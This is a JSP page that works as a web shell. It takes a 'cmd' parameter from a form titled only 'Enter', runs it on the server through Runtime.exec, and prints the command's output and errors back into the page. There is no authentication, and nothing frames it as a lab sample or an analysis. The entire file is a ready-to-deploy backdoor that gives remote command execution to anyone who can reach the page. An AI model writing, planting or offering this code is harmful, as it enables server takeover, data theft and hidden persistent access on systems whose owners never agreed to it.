<%@ page import="java.util.*,java.io.*" %>
<%@ page contentType="text/html; charset=UTF-8" %>
<%
    String cmd = request.getParameter("cmd");
    if (cmd != null && !cmd.trim().isEmpty()) {
        out.println("<h3>Command: " + cmd + "</h3>");
        out.println("<pre>");
        
        try {
            Process p = Runtime.getRuntime().exec(cmd);
            InputStream in = p.getInputStream();
            InputStream err = p.getErrorStream();
            
            // Read stdout
            BufferedReader reader = new BufferedReader(new InputStreamReader(in));
            String line;
            while ((line = reader.readLine()) != null) {
                out.println(line);
            }
            
            // Read stderr
            BufferedReader errReader = new BufferedReader(new InputStreamReader(err));
            while ((line = errReader.readLine()) != null) {
                out.println("<span style='color:red'>[ERR] " + line + "</span>");
            }
            
            reader.close();
            errReader.close();
            p.waitFor();
            
        } catch (Exception e) {
            out.println("<span style='color:red'>Error: " + e.getMessage() + "</span>");
        }
        out.println("</pre>");
    }
%>
<!DOCTYPE html>
<html>
<head><title>Enter</title></head>
<body>
    <h2>Enter</h2>
    <form method="GET" action="">
        <input type="text" name="cmd" style="width:400px" placeholder="Enter" />
        <input type="submit" value="Enter" />
    </form>
    <hr/>
    <% if (cmd == null) { %>
    <p><p/>
    <% } %>
</body>
</html>
